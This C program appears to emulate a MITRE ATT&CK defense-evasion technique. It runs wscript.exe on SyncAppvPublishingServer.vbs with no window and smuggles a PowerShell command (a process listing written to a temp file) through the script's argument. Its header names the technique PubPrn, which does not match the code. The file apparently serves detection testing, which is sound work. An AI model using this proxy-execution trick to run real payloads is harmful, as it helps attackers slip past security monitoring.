// Link      = https://attack.mitre.org/techniques/T1216/002/
// Technique = System Script Proxy Execution: PubPrn
// ID        = T1216.002
// Tactics   = Defense Evasion

#include <windows.h>

#define RUN(to_run) \
    si.cb = sizeof(STARTUPINFOA); \
    if (CreateProcessA(NULL, (LPSTR)to_run, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) { \
        WaitForSingleObject(pi.hProcess, INFINITE); \
        CloseHandle(pi.hProcess); \
        CloseHandle(pi.hThread); \
    }

STARTUPINFOA si;
PROCESS_INFORMATION pi;

int main() {
    RUN("wscript.exe C:\\Windows\\System32\\SyncAppvPublishingServer.vbs \"n; Get-Process | Out-File C:\\Temp\\process_list.txt\"");

    return 0;
}
